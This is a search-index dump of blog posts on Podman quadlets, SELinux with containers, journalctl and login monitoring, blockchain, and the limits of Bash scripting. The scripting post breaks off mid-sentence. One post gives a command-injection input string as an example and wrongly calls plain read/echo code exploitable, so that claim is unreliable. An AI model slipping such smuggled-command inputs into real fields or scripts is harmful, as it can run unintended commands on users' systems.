in:</p> <ul> <li>System-wide containers: <code>/etc/containers/systemd/</code></li> <li>User-specific containers: <code>$HOME/.config/containers/systemd/</code></li> </ul> <p>To learn more, you can check the manual: <pre><code>man quadlet\n</code></pre></p>"},{"location":"blog/2025/03/21/podmans-new-way-no-more-generate-systemd/#example-container-file","title":"Example <code>.container</code> File","text":"<p>Here's a quick example of an <code>.container</code> file for running Nginx as a service:</p> <pre><code>[Unit]\nDescription=Example Quadlet Container\nRequires=network-online.target\nAfter=network-online.target\n\n[Container]\nImage=docker.io/library/nginx:latest\nPublishPort=8080:80\n# Remember about :Z (to properly set the SELinux context on the host)\nVolume=/srv/nginx/html:/usr/share/nginx/html:Z\nVolume=/srv/nginx/conf:/etc/nginx/conf.d:Z\nUser=1000\nEnvironment=NGINX_HOST=localhost\nEnvironment=NGINX_PORT=8080\n\n[Service]\nExecStartPre=-/usr/bin/podman pull docker.io/library/nginx:latest\nRestart=always\nTimeoutStartSec=30\n\n[Install]\nWantedBy=default.target\n</code></pre>"},{"location":"blog/2025/03/21/podmans-new-way-no-more-generate-systemd/#understanding-the-sections","title":"Understanding the Sections","text":"<p>This setup ensures that:</p> <ul> <li>The service waits for the network before starting.</li> <li>It pulls the latest Nginx image before running (ignoring failures with <code>-</code>).</li> <li>It automatically restarts on failure.</li> <li>It starts on boot because of the <code>[Install]</code> section.</li> </ul> <p>To enable and start the service: <pre><code>systemctl --user enable example-nginx.container --now\n</code></pre></p>"},{"location":"blog/2025/03/21/podmans-new-way-no-more-generate-systemd/#verifying-your-setup","title":"Verifying Your Setup","text":"<p>To check if everything is correctly formatted, run: <pre><code>/usr/lib/systemd/system-generators/podman-system-generator --dry-run --user\n</code></pre> This will validate your <code>.container</code> files and generate the expected systemd service output.</p>"},{"location":"blog/2025/03/21/podmans-new-way-no-more-generate-systemd/#enabling-running-containers-as-services","title":"Enabling &amp; Running Containers as Services","text":"<p>Containers work as services, so they must have an <code>[Install]</code> section if you want them to start on boot. Otherwise, enabling them will fail with:</p> <p>Failed to enable unit: Unit xyz is transient or generated.</p> <p>If the <code>[Install]</code> section is missing, you can still manually start the service, but it won\u2019t persist across reboots.</p>"},{"location":"blog/2025/03/21/podmans-new-way-no-more-generate-systemd/#linger-option-in-systemd","title":"Linger Option in Systemd","text":"<p>By default, user services managed by <code>systemd</code> only run while the user is logged in.</p> <p>However, Docker containers are persistent, meaning they run even when no users are logged in.</p> <p>To check if lingering is enabled for a user: <pre><code>loginctl show-user $USER\n# or\nls /var/lib/systemd/linger/ # and look for the user\n</code></pre> If it outputs <code>Linger=no</code>, user services will not persist after logout.</p> <p>To enable lingering (allow user services to run after logout): <pre><code>loginctl enable-linger $USER\n</code></pre> This ensures that containers run persistently without requiring an active session.</p>"},{"location":"blog/2025/03/21/podmans-new-way-no-more-generate-systemd/#common-errors-fixes","title":"Common Errors &amp; Fixes","text":""},{"location":"blog/2025/03/21/podmans-new-way-no-more-generate-systemd/#1-failed-to-enable-unit-error","title":"1. \"Failed to Enable Unit\" Error","text":"<p>If you get:</p> <p>Failed to enable unit: Unit xyz is transient or generated. It means your <code>.container</code> file is missing an <code>[Install]</code> section.</p> <p>Fix: Add this to your <code>.container</code> file: <pre><code>[Install]\nWantedBy=default.target\n</code></pre></p>"},{"location":"blog/2025/03/21/podmans-new-way-no-more-generate-systemd/#2-failed-to-connect-to-d-bus-error","title":"2. \"Failed to Connect to D-Bus\" Error","text":"<p>If you see:</p> <p>Failed to connect to D-Bus. It means <code>systemctl --user</code> is running without an active session.</p> <p>Fix: - Log in via TTY terminal (<code>Alt + F6</code>) - Log out and back in through your login manager - Use SSH (if <code>sshd</code> is running):</p> <p>Or even better as i recently find out on stackexchange <pre><code># You  avoiding mannualy creating a session with\n# machinectl shell root@.host\n  sudo systemctl --user -M user1@ status myunit.service\n</code></pre></p>"},{"location":"blog/2025/03/21/podmans-new-way-no-more-generate-systemd/#conclusion","title":"Conclusion","text":"<p>The <code>.container</code> format makes managing containers with systemd much simpler and more reliable. Instead of manually defining systemd service files, we now have a more structured, declarative approach.</p>"},{"location":"blog/2024/08/19/selinux-suprises/","title":"Selinux suprises","text":"<p>When it comes to SELinux, many of us initially find it to be quite a hassle. In fact, I had to change the topic of this article because my original plan was to discuss how to create your own control center using Grafana, Prometheus, and Golang. However, once I started deploying containers, everything took a turn for the worse\u2026</p>"},{"location":"blog/2024/08/19/selinux-suprises/#before-we-begin","title":"Before We Begin","text":"<p>To follow along with this tutorial, you\u2019ll need to download a special Red Hat instruction.</p> <p>If you think you are so smart that you won\u2019t need it, I\u2019ll say you will miss a lot. But for those who won\u2019t believe, I leave this\u2026</p> <p>Het_Tanis once mentioned on stream that:</p> <p>\u201cThey disabled SELinux, and the next day, when the Red Hat team discovered this, they found those colorful mannuals left on the table.\u201d</p>"},{"location":"blog/2024/08/19/selinux-suprises/#so-we-got-mods","title":"So we got Mods","text":"<p>So before we dive deep into containers we have to do a little warm up about SELinux itself.</p> <p>First, we need to decide which mode we want to run SELinux in.</p> <p>There are three states of SELinux:</p> <ul> <li>Permissive</li> <li>Enforcing</li> <li>Disabled</li> </ul> <p>To check the current status, use the command <code>sestatus</code>.</p> <p>We can skip the \u201cDisabled\u201d because none of us wants to receive a copy of the coloring book handed to us in front of our boss!</p> <p>This leaves us with two options: - we can either conform to the Red Hat specifications - or take the permissive route.</p> <p>Typically, people recommend using permissive mode in two scenarios:</p> <ol> <li>When you want to check if the service you are using works on its     own and deal with SELinux later.</li> <li>You know what you are doing.</li> </ol> <p>However, a lack of SELinux enforcement may be flagged as a security concern by your security team.</p> <p>So, why would you leave it unattached?</p> <p>The reality is that often you don\u2019t need full protection, sometimes you just want a safety net.</p> <p>What you can do is set up alerts in your logging manager on a remote system so that if something goes wrong, it can handle it or deal with it later.</p> <p>However, this should not be done on production systems!!!</p> <p>I will show you this in my future post so stay tuned for that!</p>"},{"location":"blog/2024/08/19/selinux-suprises/#understanding-selinux-labels","title":"Understanding SELinux Labels","text":"<p>In SELinux, file labeling is crucial and follows this format:</p> <p><code>user:role:type:level</code></p> <p>Unless you work for a governmental institution, you can skip user, level, and role, and default to unconfined.</p> <p>This is primarily relevant for Multi-Level Security (MLS).</p> <p>To view the SELinux context of files, you can use the following command:</p> <pre><code>ls -Z\n</code></pre> <p>All you have to remeber is the first part of the context, such as <code>httpd_t</code>, it indicates which components can interact with each other.</p> <p>For instance, <code>httpd_t</code> can interact with all <code>httpd</code> components but cannot interact with <code>ssh_t</code>.</p> <p>Even if you set file permissions to <code>777</code>, SELinux will still enforce its policies and block access.</p> <p>Another interesting aspect of SELinux is that the context is stored in memory during startup. If you check the output of the command:</p> <pre><code>ps -auxZ\n</code></pre> <p>You will see that even running processes maintain their SELinux context. The same principle applies to network ports. By using the command:</p> <pre><code>ss -tunaZ\n</code></pre> <p>You can view the associated contexts for network connections.</p> <p>Typically, different services are linked to default ports. For example, if you want to enable SSH to listen on port 6969, you would need to execute the following command:</p> <pre><code># -a is for add, -t is for type, -p is for port\nsudo semanage port -a -t ssh_port_t -p tcp 6969\n</code></pre>"},{"location":"blog/2024/08/19/selinux-suprises/#where-this-all-is-defined-and-how-to-be-lazy","title":"Where This All Is Defined and How to Be Lazy","text":"<p>There are a lot of apps that work similarly to each other, so if you ever worried about the policy or the context, look them up and basically copy it.</p> <p>The contexts are stored in <code>/etc/selinux/targeted/contexts/files/file_contexts</code>.</p> <p>There are almost 7000 default contexts inside it (6658 on my system). To set one, you have to first point SELinux to what the context should be:</p> <pre><code>sudo semanage fcontext -a -t new_type_t '/path/to/file_or_directory'\n</code></pre> <p>As I mentioned, this won\u2019t change the context immediately. Since you set it as default, you have to restore it with:</p> <pre><code># -R is for recursive \nsudo restorecon -Rv /var/www/html\n</code></pre>"},{"location":"blog/2024/08/19/selinux-suprises/#labels-when-it-comes-to-containers","title":"Labels when it comes to containers \u2026","text":"<p>Finally, we made it to the shore</p> <p>Typically, not many people discuss using containers with SELinux. And that\u2019s a mistake.</p> <p>Containers are superior due to the fact that they are isolated and do not interact with the host system as much. They are much easier to handle than, for example, writing custom policies.</p> <p>Becouse of unique lables inside them.</p> <p>However, there are some nuances that need to be covered.</p> <p>You might think that Docker or Podman already handle SELinux and set up the proper labels, and you would be correct that the default type on the container is managed.</p> <p>However, this does not apply to the volumes.</p> <p>\u201cIf the content on the host system leaks into a container or a container process escapes, then SELinux blocks access.\u201d</p> <p>Link to full article</p> <p>Unless you explicitly set the flag for the volume, SELinux will consider it an intrusion.</p> <p>To resolve this, you need to add :Z at the end of the volume flag:</p> <p>Uppercase <code>:Z</code> restricts access so that only one specific container can access the volume. Lowercase <code>:z</code> allows other containers to use the same volume.</p> <pre><code># Example\n docker run -v /test/data:/data:Z\n</code></pre> <p>This set\u2019s the content to <code>container_t</code> but therse a catch it changes the context for the dir.</p> <p>What if u only want file as a volume?</p> <p>Then u have to change the context of the file to <code>container_file_t</code> This ussualy will resovle issues but we forgot about one small detail.</p> <p>By default docker has access to</p> <ul> <li>/usr/var/</li> <li>/var/lib/docker</li> <li>/var/lib/containers</li> <li>most things in /etc.</li> </ul> <p>So the <code>/var/log</code> might be problematic then u have to change the context to <code>svirt_sandbox_file_t</code></p> <p>Here u have more info about it Docker SELinux Security Policy</p> <p>Alternatively, you can try udica.</p> <p>This tool will relabel the context to meet the requirements of the containers, so you don\u2019t have to allows every container to read <code>/var/log</code>.</p>"},{"location":"blog/2024/08/19/selinux-suprises/#how-to-even-track-selinux-issues","title":"How to Even Track SELinux Issues","text":"<p>When people say SELinux is hard to debug, I think they forget about <code>journalctl</code>.</p> <p>The messages are quite extensive and usually point you to what to do in order to resolve the issues.</p> <p>You just have to know where to look for them.</p> <p>All SELinux messages can usually be spotted via <code>journalctl</code> by searching for \u201cSELinux\u201d:</p> <pre><code># This is the current boot session\njournalctl -b 0\n</code></pre> <p>Alternatively, you can check what <code>journalctl</code> uses under the hood, which is <code>/var/log/messages</code>.</p> <p>Another way to find SELinux messages is if <code>auditd</code> is enabled:</p> <pre><code># This will list SELinux messages\nausearch -m avc\n\n# or \ngrep \"denied\" /var/log/audit/audit.log\n</code></pre> <p>Here is more info how to do it Troubelshootig Selinux Logs</p>"},{"location":"blog/2024/08/19/selinux-suprises/#its-not-as-scary-as-its-made-out-to-be","title":"It\u2019s not as scary as it\u2019s made out to be","text":"<p>So there you have it! SELinux might feel like a headache at first, especially with containers, but it\u2019s really not that scary.</p> <p>Once you get the hang of contexts, labels, and a few key commands, you\u2019ll see it\u2019s manageable.</p> <p>Just remember to check your SELinux status, use journalctl for logs, and don\u2019t forget about those volume flags when working with Docker.</p> <p>With a little practice, you\u2019ll be navigating SELinux like a pro.</p> <p></p>"},{"location":"blog/2024/06/20/succumb-to-the-tech-lifestyle/","title":"Succumb to the tech lifestyle","text":"<p>Nowadays, there are many movements and lifestyles to follow: alpha, sigma, red pill, woke, leftist, rightist. But nobody says anything about the technicians.</p> <p></p> <p>Can IT professionals beat the alpha male?</p> <p></p> <p>I know, I know you think that people who spend most of their time behind a screen, repairing printers and watching anime, can\u2019t be equal to Andrew Tate or any other self-proclaimed guru.</p> <p>You might see us as a bunch of quiche eating nerds who have no lives or girlfriends.</p> <p>But think again. We\u2019re the Davids in this battle, and we all know how that story ends.</p>"},{"location":"blog/2024/06/20/succumb-to-the-tech-lifestyle/#were-the-builders","title":"We\u2019re the Builders","text":"<p>When was the last time you built something?</p> <p>Not just blindly copied data into an Excel sheet or sent an email, but truly created something?</p> <p>Creation is one of our primary human instincts.</p> <p>It\u2019s the feeling that something is truly yours, that you have control over it.</p> <p>As IT professionals, we create things every day.</p> <p>It doesn\u2019t matter how shitty it is.</p> <p>Your code might not be optimized; a simple for-loop might take two hours to run.</p> <p>But it\u2019s yours.</p> <p>From automation scripts to building computers from scratch, we are constantly creating.</p> <p>We even build the web so you can brag about your problems and sell your ponzi schemes.</p> <p>We\u2019re the builders.</p>"},{"location":"blog/2024/06/20/succumb-to-the-tech-lifestyle/#we-love-our-tools","title":"We Love Our Tools","text":"<p>Emacs, Vim, Linux, Windows, React, Solid, Ranger, vifm we know them inside and out.</p> <p>While most people watch Netflix in their free time, we tinker with configuration files.</p> <p>It\u2019s our fetish.</p> <p>But oh boy, how smooth the experience is.</p> <p>Our world is all about DX (Developer Experience) and positive laziness.</p> <p>We love automation.</p> <p>Do you think all these dotfiles are moved manually?</p> <p>For every action you do, we have a bot, a shortcut, or a script ready.</p> <p>One day, we will automate everything so thoroughly that we won\u2019t be needed anymore\u2026</p>"},{"location":"blog/2024/06/20/succumb-to-the-tech-lifestyle/#were-the-learners","title":"We\u2019re the learners","text":"<p>I\u2019m sure you\u2019ve thought at least once in your life that what you learn in school won\u2019t help you in the real world.</p> <p>There\u2019s no such thought here because there\u2019s no school. It\u2019s just you and your text editor.</p> <p>It\u2019s truly liberating because you find the purpose for learning.</p> <p>You learn because you want solve your problem, not just to pass a test.</p> <p>The hands-on experience is constantly intertwined with theoretical knowledge.</p> <p>We seek knowledge and have unlimited resources #Google.</p> <p>Here,you\u2019re never hopeless.</p> <p>But really read the f\u2026 manual</p> <p>If you ever feel stuck or overwhelmed, you can always find a way to abstract the problem.</p> <p>We use abstraction to not just solve issues but to simplify and transform complex concepts into manageable, understandable pieces.</p> <p>U see one day the abstraction will literally blow your mind.</p>"},{"location":"blog/2024/06/20/succumb-to-the-tech-lifestyle/#we-are-the-community","title":"We are the community","text":"<p>People might dive in, gushing about tools and programming languages, but when they see you creating, they\u2019re always ready to help.</p> <p>It doesn\u2019t matter what you\u2019ve done before. What matters is that now you\u2019re one of us.</p> <p>We love to see new faces and fresh ideas.</p> <p>We have countless Discord channels and communities where we share and collaborate, embracing everyone who joins.</p> <p>My friend used to say, \u201cIT is such a broad field that it will accept anyone\u201d and that\u2019s what ultimately drew me to this mentality.</p> <p>Here, you\u2019ll find what you love because we have it all.</p> <p>From stereotypical programming to UX development, system administration, data science, and tech marketing.</p> <p>Pick your poison,</p> <p>You don\u2019t have to be a programmer.</p> <p>There are plenty of roles that don\u2019t require coding.</p> <p>What we need from you is to succumb to the tech lifestyle.</p>"},{"location":"blog/2024/06/20/succumb-to-the-tech-lifestyle/#to-sum-up","title":"To sum up","text":"<p>I hope you\u2019ve picked your champion because the evidence is overwhelming\u2026</p> <p>Either way, peace out for now.</p> <p>Future projects won\u2019t build themselves</p> <p>PS: Looking forward to the epic rap battle between the Primogen and Andrew Tate!</p>"},{"location":"blog/2024/01/16/the-gold-is-in-the-block/","title":"The gold is in the block","text":"<p>People often find excitement in the world of crypto, blockchain, and NFTs, only to fall victim to scams or invest in worthless tokens.</p> <p>Instead of digging into the systems behind all these treasures, they\u2019re all about owning stuff on the web.  It\u2019s like they\u2019re hunting for treasures without a map </p> <p>What\u2019s kinda funny is that I actually find the technology itself more intriguing than the supposed treasures it holds. But there\u2019s always that nagging concern \u2013 what if some digital pirates come to snatch it all away? Well, there\u2019s a cool trick called Zero-Knowledge Proofs</p> <p>It\u2019s like a math algorithm that lets you confirm stuff without giving away your secrets.</p> <p>Take cryptocurrency transactions, for example.</p> <p>You can check your funds without revealing who you are or your password.</p> <p>Now, I\u2019ll be honest, I don\u2019t quite grasp all the math behind it \u2013 I\u2019m just a humble software developer.</p> <p>But you know what? The concept is like stumbling upon a hidden gem itself. If you wanna dive deeper into this, check out the video It\u2019s a fun watch!</p>"},{"location":"blog/2024/01/16/the-gold-is-in-the-block/#everythign-is-an-account","title":"Everythign is an account","text":"<p>Think of blockchain like a bank, always keeping tabs on transactions.</p> <p>But what sets it apart is the power of Smart Contracts.</p> <p>These contracts are essentially sets of predefined instructions stored within accounts on the blockchain.</p> <p>When specific conditions are met, these instructions automatically execute, without the need for intermediaries.</p> <p>Well, the Solana blockchain takes a similar approach, but here, \u201cEverything is an Account.\u201d</p> <p>In this world, each account is a neat, structured entity with predefined rules, kind of like how protocol buffers or GraphQL APIs work.</p> <p>When you call programs through RPC (think of it like making an API call), it feels a lot like using REST for a super-sized database with its very own API.</p>"},{"location":"blog/2024/01/16/the-gold-is-in-the-block/#so-whats-the-buzz-about-if-its-just-a-fancy-database","title":"So, what\u2019s the buzz about if it\u2019s just a fancy database?","text":"<p> Why all the fuss about blockchain, you might ask? It\u2019s similar to folks mistaking it for rocket science when, in reality, it\u2019s quite a straightforward process.</p> <p>Here are the steps: You start by defining all the accounts that\u2019ll be part of your program\u2019s context.</p> <p>Then, you write down the instructions for what each account will do and who\u2019s paying the bill for the execution and uptime (that\u2019s the \u2018gas fees\u2019 part).</p> <p>Once you\u2019ve got that sorted, you deploy it onto the devnet, and your app creates JavaScript types, that you will use to interact with the program.</p> <p>All you really need is a program public key (program id), because smart programs are essentially accounts themselves. And voila!</p> <p>You\u2019re ready to interact with it, and it\u2019s out there in the world, with all the records easily accessible.</p> <p>Now, for the fun part, tools like Anchor and Solana-CLI are like your very own playground in the blockchain world. They make it easy for developers to dive in and experiment, giving you a chance to go from zero to \u2018rich\u2019 in seconds\u2026 well, maybe \u2018temporarily rich\u2019 is more like it (try Solana airdrop 2).</p> <p>If you ask me, it\u2019s worth a shot. Building yet another dull CRUD app might just start feeling thrilling all over again. Plus, Solana even offers a native solana playground where you can test it out without configuring anything.</p>"},{"location":"blog/2024/01/16/the-gold-is-in-the-block/#nfts-more-than-just-million-dollar-images","title":"NFTs: More Than Just Million-Dollar Images","text":"<p>Ask a random person about NFTs, and they\u2019ll likely tell you it\u2019s all about the images. But in reality, it\u2019s not just the image. It\u2019s the token and the link to where the data is stored that make it unique. Learn More about NFTs</p> <p>The actual image or any other data isn\u2019t on the blockchain itself. It\u2019s the proof that this digital asset belongs to you. Think about where ownership matters most?</p> <p>The answer is gaming Items like skins, swords, characters, or avatars can become NFTs, allowing players to truly own and trade them.</p> <p>Traditional methods of selling entire game accounts fall short in the context of in-game economies. NFTs add a new layer to the gaming experience by enabling the transfer of specific items.</p> <p>Imagine being part of a special event within a game and having an NFT to prove your exclusive possession of something.</p> <p>It not only enhances the gaming experience but also lets you show off to your friends, thanks to your ownership details right there on the blockchain. NFTs aren\u2019t limited to gaming, though. Companies can use them to guarantee authenticity and traceability Learn More.</p> <p>For example, if you run a shop selling T-shirts, you can record each transaction on the blockchain, showcasing purchases from eco-friendly providers.</p> <p>Later, when the item is ready, you can create an NFT with a link to the entire production process.</p> <p>This allows consumers to verify the legitimacy of their purchase.</p> <p>The beauty of it is that you\u2019re not restricted to existing blockchains. But I\u2019ll save that topic for another post\u2026</p> <p> Just remember, blockchain isn\u2019t just about sketchy stuff. It\u2019s a whole playground waiting to be explored. Beyond all the hype, there are some cool hidden features and possibilities to discover.</p> <p>So, don\u2019t let the noise get in the way of finding some awesome opportunities in this world of blockchain tech.</p> <p>Great Starting Point for Blockchain</p>"},{"location":"blog/2024/06/06/the-only-journal-worth-reading/","title":"The only journal worth reading","text":"<p>Everyone has that moment in their life when they think, \u201cMaybe today is the day I\u2019ll start journaling.\u201d It\u2019s just a fleeting thought. You pick up the pen, only to realize that after a long day, you struggle to recall anything significant. Or worse, there\u2019s an overwhelming amount to write about, leaving you torn between writing it all and watching TV with your favorite anime girlfriend. Fortunately, we have computers\u2026</p>"},{"location":"blog/2024/06/06/the-only-journal-worth-reading/#computers-log-everything","title":"Computers log everything","text":"<p>Booting, crashes, and now even your browser activity. Recently, Microsoft announced their new killer feature called Copilot Recall. It\u2019s a personal LLM that logs every keystroke and every action you do on your computer, essentially taking screenshots every 5 seconds if the content on your desktop changes.</p> <p>Microsoft even designed a dedicated chip to support this AI model, called the Turbocharged NPU.</p> <p>Here are the requirements:</p> <p></p> <p>-A Copilot Plus PC with the special chip</p> <p>-16 GB of RAM</p> <p>-8 processors</p> <p>-256 GB storage</p> <p>-50 GB memory storage</p> <p>-An additional 25 GB for all the screenshots</p> <p></p> <p>With this, you won\u2019t have to remember anything. A tool that, after six months, will recall what nasty OnlyFans video you watched or why your friend was wrong about Bill Gates.</p> <p>This is a bad example of logging.</p> <p></p> <p>It\u2019s not like capturing moments isn\u2019t important, but sometimes it\u2019s better to forget.</p> <p></p> <p>If you watched \u2018The Entire History of You\u2019, the third episode of the first season of Black Mirror, you\u2019ll quickly understand how destructive this can be for human psychology.</p> <p></p> <p>But it\u2019s easy; we can always go to therapy.</p> <p></p> <p>What\u2019s more worrying is that someone else can see everything we do. Although Microsoft claims that this will remain only on your local computer (for now!), this doesn\u2019t make it less vulnerable.</p> <p>It\u2019s also closed-source, so you don\u2019t have any idea whether this is true. Imagine a malicious actor getting access to the contents of this vector database.</p> <p>They would have literally everything. Considering it\u2019s a new feature, there will likely be many bugs and vulnerabilities. It\u2019s already possible with just two lines of code, as they\u2019re just files in AppData, in the new CoreAIPlatform folder.</p> <p>For more information, check this article: How to do it.</p> <p></p> <p>Today, however, I want to present a more positive side of logging, the balance between privacy and functionality. Please welcome our todays guest , journalctl.</p> <p>The only journal worth reading</p>"},{"location":"blog/2024/06/06/the-only-journal-worth-reading/#a-small-introduction","title":"A Small Introduction","text":"<p>Journalctl is an honorable member of the systemd tools suite.</p> <p>It manages the logging portion of all the units.</p> <p>It\u2019s important to know that its logs are binary.</p> <p>This means you won\u2019t be able to see them directly, but it also saves you quite a lot of space.</p> <p></p> <p>If you want to know whether journalctl is enabled, check out /etc/systemd/journald.conf.</p> <p>You should have Storage set to persistent.</p> <p>If not, change this and run sudo systemctl reload systemd-journald.</p> <p>(because journalctl is also a unit by itself)</p> <p></p> <p>If you\u2019re ever worried that journalctl will take all your space, try this command to realize how little space that amount of information takes:</p> <p></p> <pre><code>journalctl --disk-usage\n</code></pre> <p></p>"},{"location":"blog/2024/06/06/the-only-journal-worth-reading/#how-does-journalctl-think","title":"How Does journalctl Think?","text":"<p>Journalctl views the changing reality of your system in eight categories.</p> <p>This mindset is called structured logging, and it\u2019s worth adopting.</p> <p>Usually, when we log something in an application, we think of it as a simple statement\u2014perhaps noting an error or confirming that execution was successful.</p> <p>Some of us, especially more advanced users, add timestamps and exit codes to the logging architecture.</p> <p>That\u2019s good, but there\u2019s one issue: it\u2019s really hard to know what is what.</p> <p></p> <p>Is it a warning, an error, or maybe a notice that I have to change my configuration?</p> <p></p> <p>As the log grows, it becomes even harder to search for errors or alerts.</p> <p>That\u2019s why people use packages like log/slog to make the logging searchable and manageable.</p> <p>Remember that structured logs can be parsed in any format.</p> <p>If you don\u2019t like JSON, no problem\u2014there\u2019s XML or even a CSV version.</p> <p></p> <p>To search for a particular priority in journalctl, we use:</p> <p></p> <pre><code>-p or --priority: number\n</code></pre> <p></p> <p>Of course, you can search for multiple priorities with:</p> <p></p> <pre><code>journalctl -p 4..6\n</code></pre> <p></p> <p>Most components of our computers are units.</p> <p>We can usually add the -u flag, or since <code>systemd</code> is the parent of all processes, we can use filters by UID, GID, or PID:</p> <p></p> <pre><code>journalctl _PID: 1234\n</code></pre> <p></p> <p>This structured approach allows you to quickly filter and find specific types of log messages, making system administration more efficient.</p>"},{"location":"blog/2024/06/06/the-only-journal-worth-reading/#we-are-surrounded-by-sessions","title":"We Are Surrounded by Sessions","text":"<p>Yoga sessions, therapy sessions, browser sessions , sessions are everywhere. journalctl is no exception; it keeps things real with its boot session</p> <p></p> <p>To list them, just type:</p> <p></p> <pre><code>journalctl --list-boots\n</code></pre> <p></p> <p>Number 0 is the current boot session (a small tribute to programmers).</p> <p></p> <p>To pick a specific boot session, you can use the -b flag followed by the boot number.</p> <p>For example, to view the logs from the previous boot session, you can use:</p> <p></p> <pre><code>journalctl -b -1\n</code></pre> <p></p> <p>But journalctl isn\u2019t alone; there are many more journalists among us\u2026</p>"},{"location":"blog/2024/06/06/the-only-journal-worth-reading/#who-watches-last-lastb-somebodys-watching-me","title":"Who Watches Last, Lastb? Somebody\u2019s Watching Me?","text":"<p>I always feel like Somebody\u2019s Watching Me\u2026</p> <p>Such a good tune, truly a fan. But back to the point.</p> <p></p> <p>Have you ever wondered how to check the first time you successfully logged into the system? I bet you don\u2019t me neither.</p> <p>Usually, we skip the successful logins because we live in a single-user environment, meaning if somebody logged in successfully, it should be us.</p> <p></p> <p>But we forget that these files don\u2019t only check for logging into the system.</p> <p>They check for any other login protocols like SSH, RDP, VNC, you name it. Sometimes, we forget to set up the password and a simple ssh-copy-id on our local network might be devastating.</p> <p></p> <p>That\u2019s why it\u2019s useful to check from time to time to ensure we are alone.</p> <p></p> <p>However, if we set up everything properly in terms of security\u2014authentication, password, etc.\u2014or we have a server, there\u2019s lastb that comes in handy. Can you guess what it does? Usually, the Linux commands are pretty self-explanatory, but I had a hard time memorizing this one.</p> <p>The answer: it logs the failed logins to the system. What\u2019s interesting is you can\u2019t view this command without sudo (unlike last).</p> <p></p> <p>To check successful logins, use:</p> <p></p> <pre><code>last\n</code></pre> <p></p> <p>To check failed login attempts, use:</p> <p></p> <pre><code>sudo lastb\n</code></pre> <p></p>"},{"location":"blog/2024/06/06/the-only-journal-worth-reading/#all-of-us-are-peeping-toms-somewhere-deep-down","title":"All of Us Are Peeping Toms Somewhere Deep Down","text":"<p>That\u2019s why the w command was invented.</p> <p>It lets us see what users are doing on our system in real-time. What\u2019s funny is you can use watch w to get real-time updates.</p> <p>So many watchers!</p> <p>If you don\u2019t have enough, there\u2019s also a program called whowatch which not only displays what the user is doing but also lets you kill the processes they run in real-time.</p> <p>Unfortunately, it\u2019s a bit outdated the last commit was two years ago</p> <p>(I\u2019m already thinking of rewriting this in Go since it\u2019s such a nice feature for sysadmins).</p> <p>So, if you want to mess up a 3-hour download of somebody\u2019s game, feel free\u2026</p> <p></p> <p>To see what users are doing, use:</p> <p></p> <pre><code>w\n</code></pre> <p></p> <p>To get real-time updates, use:</p> <p></p> <pre><code>watch w\n</code></pre> <p></p> <p>To use whowatch, which might need to be installed first:</p> <p></p> <pre><code>sudo apt-get install whowatch\nwhowatch\n</code></pre> <p></p>"},{"location":"blog/2024/06/06/the-only-journal-worth-reading/#logs-are-everywhere-you-just-have-to-reach-for-them","title":"Logs Are Everywhere, You Just Have to Reach for Them","text":"<p>Unfortunately, in the Linux world, we tend to skip any form of reading logs because it\u2019s much simpler and quicker to create a new machine or to format it than to traverse through the logs. But this is the wrong way of thinking.</p> <p>It completely falls short when it comes to future problem-solving abilities. We just run from the problem.</p> <p>It\u2019s important to know that when you understand how the logs work and you try it, you gain something that is priceless. You truly know what\u2019s going on with your system.</p> <p></p> <p>This means there won\u2019t be any missing patches or broken processes that an attacker can use against you. There won\u2019t be any random crashes or kernel issues.</p> <p>Your system will be completely stable.</p> <p>And trust me, stability in the time we live in is invaluable.</p> <p>I don\u2019t have a story about catching someone red-handed trying to break into my system</p> <p>(although I recently saw a cool project about creating an easy web honeypot and catching bots in Go and really want to try it).</p> <p>But I remember when I struggled with the Qtile configuration, trying to get it right, constantly killing it, changing the code, and logging in</p> <p>it was a nightmare.</p> <p>Eventually, I left this and never came back, but there was a remedy for this. All I had to do was to read the Qtile log file at \\~/.local/share/qtile/qtile.log, and I would have known what I messed up.</p>"},{"location":"blog/2024/06/06/the-only-journal-worth-reading/#to-sum-up","title":"To Sum Up","text":"<p>Logging doesn\u2019t have to be scary (despite Microsoft demonizing it). I hope I convinced you to at least try it for fun with whowatch or to explore how programmers design their logs. Sometimes it might be hard to keep track of everything, I know this. In the next post, I will try to show you that you can make it far easier by creating audits.</p> <p>But for now, peace out and remember: journalct is the only journal worth reading.</p>"},{"location":"blog/2024/07/09/the-world-doesnt-end-with-scripting/","title":"The world doesnt end with scripting","text":"<p>When you start your Linux journey or follow Linux-based YouTubers, you often hear them praising the benefits of writing scripts.</p> <p>They encourage you to create your own scripts for various tasks because</p> <p>\u201cscripts are simple yet powerful tools to get your work done.\u201d</p> <p>They suggest downloading and using scripts to experience these benefits firsthand, advocating for Bash as the go-to scripting language due to its versatility and ease of use.</p> <p>However, what they don\u2019t mention is\u2026</p>"},{"location":"blog/2024/07/09/the-world-doesnt-end-with-scripting/#the-misinterpretation","title":"The Misinterpretation","text":"<p>The first thing to keep in mind is that shell scripts shouldn\u2019t be the primary source of automation.</p> <p>What I want you to associate scripts with is</p> <ul> <li> <p>quick and dirty tasks</p> </li> <li> <p>verifying something fast.</p> </li> </ul> <p>The reason is shell scripting lacks built-in mechanisms for these four things:</p> <ol> <li> <p>Scripts are hard to read due to complex Bash syntax.</p> <pre><code># Example\na=\"Hello\"\nb=\"World\"\n\nc=$a\" \"$b\nd=$b\" \"$a\n\ne=$c$'\\n'$d\necho -n \"$e\" \\\n| sed -e 's/o/O/g'\\\n| while IFS=$'\\n' read -r line; do\n  echo \"$line\"\ndone\n</code></pre> </li> <li> <p>People can easily inject variables into your code, even when using     tools like ShellCheck.</p> <pre><code># Vulnerable code\necho \"Enter your name:\"\nread name\necho \"Hello, $name!\"\n# All I have to do is type\n`John; echo \"Haha, I injected a command!\"`,\n# and you know what the output will look like...\n</code></pre> </li> <li> <p>Error handling is minimal, apart from test statements or exit     codes.</p> </li> <li> <p>Bash is slow; what works for 100 repetitions doesn\u2019t work for a     million.</p> </li> </ol> <p></p> <p>The universal rule is:</p> <p>If your script is longer than 40 lines, use a programming language.</p> <p></p>"},{"location":"blog/2024/07/09/the-world-doesnt-end-with-scripting/#so-whats-the-alternatvie-then","title":"So what\u2019s the alternatvie then?","text":"<p>Typically, when you start automating tasks like setting up virtual machines and managing dot-files, you want them to be set up quickly, especially when you\u2019re unsure which hypervisor tools to use. You can either set up a dot-files repository with scripts that symlink things to proper places or do it manually for every VM.</p> <p>Some of you may have built scripts around SSH.</p> <pre><code>ssh user@hostname \"apt install ...\"\n</code></pre> <p>But this isn\u2019t maintainable.</p> <p>As your home lab grows, you\u2019ll have more things to configure simultaneously: different machines, package managers, environments, and different types of errors.</p> <p>Trust me, elaborate scripts 